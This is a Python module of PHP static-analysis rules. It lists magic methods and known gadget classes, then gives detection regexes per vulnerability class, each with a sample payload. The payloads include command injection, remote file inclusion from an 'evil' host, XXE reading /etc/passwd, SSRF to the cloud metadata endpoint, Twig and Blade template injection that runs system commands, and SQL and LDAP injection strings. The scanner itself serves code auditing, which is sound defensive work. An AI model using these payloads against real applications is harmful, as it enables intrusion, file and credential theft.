"""
PHP SAST Patterns - Complete Magic Methods and Exploitation Patterns
"""

# ============================================================================
# PHP MAGIC METHODS - COMPLETE LIST
# ============================================================================
PHP_MAGIC_METHODS = {
    'name': 'PHP Magic Methods',
    'description': 'All PHP magic methods that can be abused for exploitation',
    'methods': {
        # OBJECT LIFECYCLE
        '__construct': {
            'trigger': 'Object instantiation via new Class()',
            'exploit_scenarios': [
                'Arbitrary file inclusion via dynamic class loading',
                'SQL injection via constructor parameters',
                'Command injection if constructor executes commands',
                'SSRF if constructor makes HTTP requests',
            ],
            'dangerous_with': ['eval', 'include', 'require', 'system', 'exec', 'shell_exec', 'popen', 'proc_open', 'passthru'],
        },
        '__destruct': {
            'trigger': 'Object destruction, garbage collection, script end',
            'exploit_scenarios': [
                'File write/delete on cleanup',
                'Command execution on cleanup',
                'Phar deserialization chains',
                'Use-after-free scenarios',
            ],
            'dangerous_with': ['unlink', 'file_put_contents', 'fwrite', 'system', 'exec'],
        },
        '__wakeup': {
            'trigger': 'unserialize() call',
            'exploit_scenarios': [
                'Object injection attacks',
                'POP chain gadgets',
                'CVE-2016-7124 bypass (PHP < 5.6.25)',
                'Arbitrary object instantiation',
            ],
            'dangerous_with': ['file_get_contents', 'include', 'eval', 'system'],
        },
        '__sleep': {
            'trigger': 'serialize() call',
            'exploit_scenarios': [
                'Information disclosure before serialization',
                'Side effects during serialization',
            ],
            'dangerous_with': ['file_put_contents', 'fwrite'],
        },
        '__serialize': {
            'trigger': 'serialize() in PHP 7.4+',
            'exploit_scenarios': [
                'Custom serialization manipulation',
                'Data exfiltration during serialization',
            ],
            'dangerous_with': [],
        },
        '__unserialize': {
            'trigger': 'unserialize() in PHP 7.4+',
            'exploit_scenarios': [
                'Same as __wakeup but newer API',
                'Bypass for __wakeup protections',
            ],
            'dangerous_with': ['eval', 'system', 'include'],
        },
        
        # PROPERTY ACCESS
        '__get': {
            'trigger': 'Access to undefined/inaccessible property',
            'exploit_scenarios': [
                'LFI via dynamic property resolution',
                'SSRF if property fetches remote data',
                'SQLi if property queries database',
            ],
            'dangerous_with': ['file_get_contents', 'include', 'curl_exec', 'mysqli_query'],
        },
        '__set': {
            'trigger': 'Assignment to undefined/inaccessible property',
            'exploit_scenarios': [
                'Arbitrary file write via property',
                'Object state manipulation',
                'Type confusion attacks',
            ],
            'dangerous_with': ['file_put_contents', 'fwrite'],
        },
        '__isset': {
            'trigger': 'isset() or empty() on undefined property',
            'exploit_scenarios': [
                'Information disclosure',
                'Side effects during check',
            ],
            'dangerous_with': ['file_exists'],
        },
        '__unset': {
            'trigger': 'unset() on undefined property',
            'exploit_scenarios': [
                'File deletion via property name',
                'Database record deletion',
            ],
            'dangerous_with': ['unlink', 'rmdir'],
        },
        
        # METHOD CALLS
        '__call': {
            'trigger': 'Call to undefined/inaccessible method',
            'exploit_scenarios': [
                'RCE if method name passed to system functions',
                'Dynamic method invocation exploitation',
                'Arbitrary function calls via method name',
            ],
            'dangerous_with': ['call_user_func', 'system', 'exec', 'eval'],
        },
        '__callStatic': {
            'trigger': 'Static call to undefined method',
            'exploit_scenarios': [
                'Same as __call but for static context',
                'Static method injection',
            ],
            'dangerous_with': ['call_user_func', 'system', 'eval'],
        },
        
        # STRING CONVERSION
        '__toString': {
            'trigger': 'Object to string conversion, echo, print, string context',
            'exploit_scenarios': [
                'XSS if returned string contains user input',
                'LFI if __toString reads files',
                'SQL Injection if used in query context',
                'POP chain component',
            ],
            'dangerous_with': ['file_get_contents', 'include', 'eval'],
        },
        
        # INVOCATION
        '__invoke': {
            'trigger': 'Object called as function $obj()',
            'exploit_scenarios': [
                'RCE via callable injection',
                'Arbitrary code execution',
                'Callback manipulation',
            ],
            'dangerous_with': ['call_user_func', 'array_map', 'array_filter', 'usort'],
        },
        
        # CLONING
        '__clone': {
            'trigger': 'clone keyword on object',
            'exploit_scenarios': [
                'Resource duplication attacks',
                'Deep copy vulnerabilities',
            ],
            'dangerous_with': ['file_get_contents', 'fopen'],
        },
        
        # STATE EXPORT
        '__set_state': {
            'trigger': 'var_export() on object',
            'exploit_scenarios': [
                'Code injection via exported state',
                'File inclusion if exported to PHP file',
            ],
            'dangerous_with': ['file_put_contents', 'eval'],
        },
        
        # DEBUGGING
        '__debugInfo': {
            'trigger': 'var_dump() on object',
            'exploit_scenarios': [
                'Information disclosure',
                'Sensitive data exposure',
            ],
            'dangerous_with': [],
        },
        
        # AUTOLOADING
        '__autoload': {
            'trigger': 'Use of undefined class (deprecated)',
            'exploit_scenarios': [
                'Arbitrary file inclusion',
                'Remote code execution via autoload',
            ],
            'dangerous_with': ['include', 'require'],
        },
    },
    
    # POP CHAIN PATTERNS
    'pop_chains': {
        'Monolog': ['BufferHandler', 'SwiftMailerHandler', 'NativeMailerHandler'],
        'Guzzle': ['FnStream', 'FileCookieJar'],
        'Laravel': ['PendingBroadcast', 'RedisBroadcaster'],
        'Symfony': ['Process', 'PhpProcess'],
        'Doctrine': ['Connection', 'DBAL\\Connection'],
        'PHPUnit': ['MockObject', 'MockBuilder'],
        'Swiftmailer': ['Swift_Transport_SendmailTransport', 'Swift_Transport_MailTransport'],
        'Phar': ['PharData', 'Phar'],
    },
}

# ============================================================================
# PHP VULNERABILITY PATTERNS
# ============================================================================
PHP_PATTERNS = [
    # ----- REMOTE CODE EXECUTION -----
    {
        'id': 'php_rce_eval',
        'name': 'PHP eval() RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'eval\s*\(\s*[\$\"\'].*?\)',
        'description': 'Direct code execution via eval()',
        'exploit': 'Inject PHP code: "; system($_GET[cmd]); //',
        'cwe': 'CWE-94',
    },
    {
        'id': 'php_rce_create_function',
        'name': 'PHP create_function() RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'create_function\s*\(\s*[\'"][^\'"]*[\'"]\s*,\s*.*?\)',
        'description': 'Code execution via create_function() (deprecated)',
        'exploit': 'Inject into function body: ";}system($cmd);//"',
        'cwe': 'CWE-94',
    },
    {
        'id': 'php_rce_assert',
        'name': 'PHP assert() RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'assert\s*\(\s*[\$\"\'].*?\)',
        'description': 'Code execution via assert() with string',
        'exploit': 'Inject: assert("system(\'id\')")',
        'cwe': 'CWE-94',
    },
    {
        'id': 'php_rce_preg_replace_e',
        'name': 'PHP preg_replace /e RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'preg_replace\s*\(\s*[\'"][^\'\"]*\/[^\/]*e[^\/]*[\'"]',
        'description': 'Code execution via preg_replace with /e modifier (deprecated)',
        'exploit': 'Inject in replacement: ${system($cmd)}',
        'cwe': 'CWE-94',
    },
    {
        'id': 'php_rce_usort_callback',
        'name': 'PHP Array Function Callback RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'(usort|uasort|uksort|array_map|array_filter|array_reduce|array_walk|array_walk_recursive|call_user_func|call_user_func_array)\s*\(\s*[\$]',
        'description': 'Code execution via array function callback',
        'exploit': 'Pass "system" as callback with controlled argument',
        'cwe': 'CWE-94',
    },
    
    # ----- COMMAND INJECTION -----
    {
        'id': 'php_cmdi_system',
        'name': 'PHP system() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'system\s*\(\s*[\$\"\'].*?\)',
        'description': 'OS command execution via system()',
        'exploit': 'Inject: "; id; #',
        'cwe': 'CWE-78',
    },
    {
        'id': 'php_cmdi_exec',
        'name': 'PHP exec() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'exec\s*\(\s*[\$\"\'].*?\)',
        'description': 'OS command execution via exec()',
        'exploit': 'Inject: `id`',
        'cwe': 'CWE-78',
    },
    {
        'id': 'php_cmdi_shell_exec',
        'name': 'PHP shell_exec() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'shell_exec\s*\(\s*[\$\"\'].*?\)',
        'description': 'OS command execution via shell_exec()',
        'exploit': 'Inject: $(id)',
        'cwe': 'CWE-78',
    },
    {
        'id': 'php_cmdi_passthru',
        'name': 'PHP passthru() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'passthru\s*\(\s*[\$\"\'].*?\)',
        'description': 'OS command execution via passthru()',
        'exploit': 'Inject: | cat /etc/passwd',
        'cwe': 'CWE-78',
    },
    {
        'id': 'php_cmdi_popen',
        'name': 'PHP popen() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'popen\s*\(\s*[\$\"\'].*?\)',
        'description': 'OS command execution via popen()',
        'exploit': 'Inject command with pipe',
        'cwe': 'CWE-78',
    },
    {
        'id': 'php_cmdi_proc_open',
        'name': 'PHP proc_open() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'proc_open\s*\(\s*[\$\"\'].*?\)',
        'description': 'OS command execution via proc_open()',
        'exploit': 'Control command array',
        'cwe': 'CWE-78',
    },
    {
        'id': 'php_cmdi_backtick',
        'name': 'PHP Backtick Command Execution',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'`[^`]*\$[^`]+`',
        'description': 'OS command execution via backticks',
        'exploit': 'Inject: `cat /etc/passwd`',
        'cwe': 'CWE-78',
    },
    {
        'id': 'php_cmdi_pcntl_exec',
        'name': 'PHP pcntl_exec() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'pcntl_exec\s*\(\s*[\$\"\'].*?\)',
        'description': 'OS command execution via pcntl_exec()',
        'exploit': 'Control path to executable',
        'cwe': 'CWE-78',
    },
    
    # ----- FILE INCLUSION -----
    {
        'id': 'php_lfi_include',
        'name': 'PHP include() LFI/RFI',
        'category': 'file_inclusion',
        'severity': 'critical',
        'pattern': r'include\s*\(\s*[\$].*?\)',
        'description': 'File inclusion via include()',
        'exploit': 'LFI: ../../etc/passwd, RFI: http://evil/shell.php, Wrapper: php://filter/convert.base64-encode/resource=config.php',
        'cwe': 'CWE-98',
    },
    {
        'id': 'php_lfi_include_once',
        'name': 'PHP include_once() LFI/RFI',
        'category': 'file_inclusion',
        'severity': 'critical',
        'pattern': r'include_once\s*\(\s*[\$].*?\)',
        'description': 'File inclusion via include_once()',
        'exploit': 'Same as include()',
        'cwe': 'CWE-98',
    },
    {
        'id': 'php_lfi_require',
        'name': 'PHP require() LFI/RFI',
        'category': 'file_inclusion',
        'severity': 'critical',
        'pattern': r'require\s*\(\s*[\$].*?\)',
        'description': 'File inclusion via require()',
        'exploit': 'Same as include()',
        'cwe': 'CWE-98',
    },
    {
        'id': 'php_lfi_require_once',
        'name': 'PHP require_once() LFI/RFI',
        'category': 'file_inclusion',
        'severity': 'critical',
        'pattern': r'require_once\s*\(\s*[\$].*?\)',
        'description': 'File inclusion via require_once()',
        'exploit': 'Same as include()',
        'cwe': 'CWE-98',
    },
    
    # ----- DESERIALIZATION -----
    {
        'id': 'php_deser_unserialize',
        'name': 'PHP Insecure Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'unserialize\s*\(\s*[\$].*?\)',
        'description': 'Object injection via unserialize()',
        'exploit': 'Craft malicious serialized object: O:8:"ClassName":1:{s:4:"prop";s:6:"system";}',
        'cwe': 'CWE-502',
    },
    {
        'id': 'php_deser_phar',
        'name': 'PHP Phar Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'(phar://|file_exists|is_file|is_dir|is_link|is_readable|is_writable|is_executable|filesize|filetype|file_get_contents|fopen|file|readfile|copy|unlink|stat|lstat|parse_url|include|require)\s*\(\s*[^)]*phar',
        'description': 'Phar deserialization attack',
        'exploit': 'Upload malicious phar, trigger via phar:// wrapper',
        'cwe': 'CWE-502',
    },
    
    # ----- SQL INJECTION -----
    {
        'id': 'php_sqli_concat',
        'name': 'PHP SQL Injection (String Concat)',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(mysql_query|mysqli_query|pg_query|sqlite_query|->query)\s*\(\s*["\'][^"\']*[\'"]\s*\.\s*\$',
        'description': 'SQL injection via string concatenation',
        'exploit': '\' OR 1=1--',
        'cwe': 'CWE-89',
    },
    {
        'id': 'php_sqli_raw',
        'name': 'PHP SQL Injection (Raw Query)',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'->raw\s*\(\s*["\'][^"\']*\$',
        'description': 'SQL injection via raw queries',
        'exploit': '\'; DROP TABLE users;--',
        'cwe': 'CWE-89',
    },
    {
        'id': 'php_sqli_sprintf',
        'name': 'PHP SQL Injection (sprintf)',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'sprintf\s*\([^)]*SELECT[^)]*%s',
        'description': 'SQL injection via sprintf formatting',
        'exploit': '%s replaced with malicious SQL',
        'cwe': 'CWE-89',
    },
    
    # ----- XSS -----
    {
        'id': 'php_xss_echo',
        'name': 'PHP Reflected XSS',
        'category': 'xss',
        'severity': 'medium',
        'pattern': r'echo\s+\$_(GET|POST|REQUEST|COOKIE)',
        'description': 'XSS via direct echo of user input',
        'exploit': '<script>alert(1)</script>',
        'cwe': 'CWE-79',
    },
    {
        'id': 'php_xss_print',
        'name': 'PHP Reflected XSS (print)',
        'category': 'xss',
        'severity': 'medium',
        'pattern': r'print\s+\$_(GET|POST|REQUEST|COOKIE)',
        'description': 'XSS via print of user input',
        'exploit': '<img src=x onerror=alert(1)>',
        'cwe': 'CWE-79',
    },
    
    # ----- XXE -----
    {
        'id': 'php_xxe_simplexml',
        'name': 'PHP XXE via simplexml_load_string',
        'category': 'xxe',
        'severity': 'high',
        'pattern': r'simplexml_load_string\s*\(\s*\$',
        'description': 'XXE via simplexml_load_string()',
        'exploit': '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        'cwe': 'CWE-611',
    },
    {
        'id': 'php_xxe_domDocument',
        'name': 'PHP XXE via DOMDocument',
        'category': 'xxe',
        'severity': 'high',
        'pattern': r'(DOMDocument|SimpleXMLElement).*loadXML\s*\(\s*\$',
        'description': 'XXE via DOMDocument::loadXML()',
        'exploit': 'Same XXE payload',
        'cwe': 'CWE-611',
    },
    
    # ----- SSRF -----
    {
        'id': 'php_ssrf_curl',
        'name': 'PHP SSRF via cURL',
        'category': 'ssrf',
        'severity': 'high',
        'pattern': r'curl_setopt\s*\([^)]*CURLOPT_URL[^)]*\$',
        'description': 'SSRF via cURL with user-controlled URL',
        'exploit': 'http://169.254.169.254/latest/meta-data/',
        'cwe': 'CWE-918',
    },
    {
        'id': 'php_ssrf_file_get_contents',
        'name': 'PHP SSRF via file_get_contents',
        'category': 'ssrf',
        'severity': 'high',
        'pattern': r'file_get_contents\s*\(\s*\$',
        'description': 'SSRF via file_get_contents() with URL',
        'exploit': 'gopher://localhost:6379/...',
        'cwe': 'CWE-918',
    },
    {
        'id': 'php_ssrf_fopen',
        'name': 'PHP SSRF via fopen',
        'category': 'ssrf',
        'severity': 'high',
        'pattern': r'fopen\s*\(\s*\$[^)]*,\s*[\'"]r',
        'description': 'SSRF via fopen() with URL',
        'exploit': 'Same as file_get_contents',
        'cwe': 'CWE-918',
    },
    
    # ----- TYPE JUGGLING -----
    {
        'id': 'php_type_juggling_loose',
        'name': 'PHP Type Juggling (Loose Comparison)',
        'category': 'type_juggling',
        'severity': 'medium',
        'pattern': r'(\$[a-zA-Z_][a-zA-Z0-9_]*\s*==\s*[\'"]0e\d+[\'"]|\$[a-zA-Z_][a-zA-Z0-9_]*\s*==\s*(true|false|null|0))',
        'description': 'Loose comparison vulnerability',
        'exploit': '"0e123" == "0e456" is true, "0" == false is true',
        'cwe': 'CWE-697',
    },
    {
        'id': 'php_type_juggling_strcmp',
        'name': 'PHP Type Juggling (strcmp)',
        'category': 'type_juggling',
        'severity': 'medium',
        'pattern': r'strcmp\s*\(\s*\$.*?\)\s*==\s*0',
        'description': 'strcmp with array returns NULL',
        'exploit': 'Pass array instead of string: ?param[]=x',
        'cwe': 'CWE-697',
    },
    {
        'id': 'php_type_juggling_md5',
        'name': 'PHP Magic Hash',
        'category': 'type_juggling',
        'severity': 'medium',
        'pattern': r'(md5|sha1)\s*\([^)]+\)\s*==\s*[\'"]0e',
        'description': 'Magic hash comparison',
        'exploit': 'md5("240610708") == md5("QNKCDZO") due to 0e starting hashes',
        'cwe': 'CWE-697',
    },
    
    # ----- FILE OPERATIONS -----
    {
        'id': 'php_file_write',
        'name': 'PHP Arbitrary File Write',
        'category': 'file_write',
        'severity': 'high',
        'pattern': r'(file_put_contents|fwrite|fputs)\s*\(\s*\$',
        'description': 'Arbitrary file write',
        'exploit': 'Write webshell to web root',
        'cwe': 'CWE-434',
    },
    {
        'id': 'php_file_delete',
        'name': 'PHP Arbitrary File Delete',
        'category': 'file_delete',
        'severity': 'high',
        'pattern': r'unlink\s*\(\s*\$',
        'description': 'Arbitrary file deletion',
        'exploit': 'Delete .htaccess or config files',
        'cwe': 'CWE-22',
    },
    
    # ----- PATH TRAVERSAL -----
    {
        'id': 'php_path_traversal',
        'name': 'PHP Path Traversal',
        'category': 'path_traversal',
        'severity': 'high',
        'pattern': r'(readfile|file|fopen|file_get_contents|include|require)\s*\([^)]*\.{2}/',
        'description': 'Path traversal vulnerability',
        'exploit': '../../../etc/passwd',
        'cwe': 'CWE-22',
    },
    
    # ----- OBJECT INJECTION -----
    {
        'id': 'php_object_injection_wakeup',
        'name': 'PHP __wakeup Object Injection',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'function\s+__wakeup\s*\([^)]*\)\s*{[^}]*(include|require|eval|system|exec|file_put_contents)',
        'description': 'Dangerous __wakeup implementation',
        'exploit': 'Craft serialized object to trigger',
        'cwe': 'CWE-502',
    },
    {
        'id': 'php_object_injection_destruct',
        'name': 'PHP __destruct Object Injection',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'function\s+__destruct\s*\([^)]*\)\s*{[^}]*(unlink|rmdir|system|exec|file_put_contents)',
        'description': 'Dangerous __destruct implementation',
        'exploit': 'Trigger via deserialization',
        'cwe': 'CWE-502',
    },
    {
        'id': 'php_object_injection_tostring',
        'name': 'PHP __toString Object Injection',
        'category': 'deserialization',
        'severity': 'high',
        'pattern': r'function\s+__toString\s*\([^)]*\)\s*{[^}]*(include|require|file_get_contents|eval)',
        'description': 'Dangerous __toString implementation',
        'exploit': 'Force string conversion via concatenation',
        'cwe': 'CWE-502',
    },
    {
        'id': 'php_object_injection_call',
        'name': 'PHP __call Object Injection',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'function\s+__call\s*\([^)]*\)\s*{[^}]*(call_user_func|system|exec|eval)',
        'description': 'Dangerous __call implementation',
        'exploit': 'Call undefined method',
        'cwe': 'CWE-502',
    },
    
    # ----- VARIABLE MANIPULATION -----
    {
        'id': 'php_extract_overwrite',
        'name': 'PHP extract() Variable Overwrite',
        'category': 'variable_manipulation',
        'severity': 'high',
        'pattern': r'extract\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)',
        'description': 'Variable overwrite via extract()',
        'exploit': 'Overwrite $admin, $is_admin variables',
        'cwe': 'CWE-621',
    },
    {
        'id': 'php_parse_str_overwrite',
        'name': 'PHP parse_str() Variable Overwrite',
        'category': 'variable_manipulation',
        'severity': 'high',
        'pattern': r'parse_str\s*\(\s*\$[^,)]+\s*\)',
        'description': 'Variable overwrite via parse_str() without array',
        'exploit': 'admin=1&is_admin=true',
        'cwe': 'CWE-621',
    },
    {
        'id': 'php_register_globals',
        'name': 'PHP Variable Variable',
        'category': 'variable_manipulation',
        'severity': 'medium',
        'pattern': r'\$\$[a-zA-Z_]',
        'description': 'Variable variable can lead to overwrite',
        'exploit': 'Control variable name to overwrite',
        'cwe': 'CWE-621',
    },
    
    # ----- HEADER INJECTION -----
    {
        'id': 'php_header_injection',
        'name': 'PHP Header Injection',
        'category': 'header_injection',
        'severity': 'medium',
        'pattern': r'header\s*\([^)]*\$_(GET|POST|REQUEST)',
        'description': 'HTTP header injection',
        'exploit': 'Inject: %0d%0aSet-Cookie: admin=1',
        'cwe': 'CWE-113',
    },
    
    # ----- OPEN REDIRECT -----
    {
        'id': 'php_open_redirect',
        'name': 'PHP Open Redirect',
        'category': 'open_redirect',
        'severity': 'medium',
        'pattern': r'header\s*\([^)]*Location[^)]*\$_(GET|POST|REQUEST)',
        'description': 'Open redirect vulnerability',
        'exploit': '?url=https://evil.com',
        'cwe': 'CWE-601',
    },
    
    # ----- CRYPTO ISSUES -----
    {
        'id': 'php_weak_random',
        'name': 'PHP Weak Random',
        'category': 'crypto',
        'severity': 'medium',
        'pattern': r'(rand|mt_rand|srand|mt_srand)\s*\(',
        'description': 'Weak pseudo-random number generator',
        'exploit': 'Predictable tokens/seeds',
        'cwe': 'CWE-330',
    },
    {
        'id': 'php_weak_hash',
        'name': 'PHP Weak Hash',
        'category': 'crypto',
        'severity': 'medium',
        'pattern': r'(md5|sha1)\s*\([^)]+\)',
        'description': 'Weak hashing algorithm',
        'exploit': 'Collision attacks',
        'cwe': 'CWE-328',
    },
    
    # ----- INFORMATION DISCLOSURE -----
    {
        'id': 'php_info_disclosure',
        'name': 'PHP Information Disclosure',
        'category': 'info_disclosure',
        'severity': 'low',
        'pattern': r'(phpinfo|var_dump|print_r|debug_backtrace)\s*\(',
        'description': 'Debug information disclosure',
        'exploit': 'Gather system information',
        'cwe': 'CWE-200',
    },
    {
        'id': 'php_error_disclosure',
        'name': 'PHP Error Display',
        'category': 'info_disclosure',
        'severity': 'low',
        'pattern': r'(display_errors\s*=\s*(1|On|true)|error_reporting\s*\(\s*E_ALL)',
        'description': 'Error display enabled',
        'exploit': 'Error messages reveal paths',
        'cwe': 'CWE-209',
    },
    
    # ----- AUTHENTICATION BYPASS -----
    {
        'id': 'php_auth_bypass_json_decode',
        'name': 'PHP Auth Bypass (json_decode)',
        'category': 'auth_bypass',
        'severity': 'high',
        'pattern': r'json_decode\s*\([^)]+\)\s*->\s*(admin|role|is_admin)',
        'description': 'JSON auth bypass',
        'exploit': 'Manipulate JSON to bypass auth',
        'cwe': 'CWE-287',
    },
    
    # ----- LDAP INJECTION -----
    {
        'id': 'php_ldap_injection',
        'name': 'PHP LDAP Injection',
        'category': 'ldap_injection',
        'severity': 'high',
        'pattern': r'ldap_search\s*\([^)]*\$',
        'description': 'LDAP injection vulnerability',
        'exploit': '*)(uid=*))(|(uid=*',
        'cwe': 'CWE-90',
    },
    
    # ----- XPATH INJECTION -----
    {
        'id': 'php_xpath_injection',
        'name': 'PHP XPath Injection',
        'category': 'xpath_injection',
        'severity': 'high',
        'pattern': r'(xpath|query)\s*\([^)]*\$',
        'description': 'XPath injection vulnerability',
        'exploit': "' or '1'='1",
        'cwe': 'CWE-643',
    },
    
    # ----- TEMPLATE INJECTION -----
    {
        'id': 'php_ssti_twig',
        'name': 'PHP SSTI (Twig)',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'->render\s*\([^)]*\$',
        'description': 'Server-side template injection',
        'exploit': '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
        'cwe': 'CWE-94',
    },
    {
        'id': 'php_ssti_blade',
        'name': 'PHP SSTI (Blade)',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'Blade::compileString\s*\(\s*\$',
        'description': 'Laravel Blade template injection',
        'exploit': '@php system($_GET["cmd"]); @endphp',
        'cwe': 'CWE-94',
    },
]
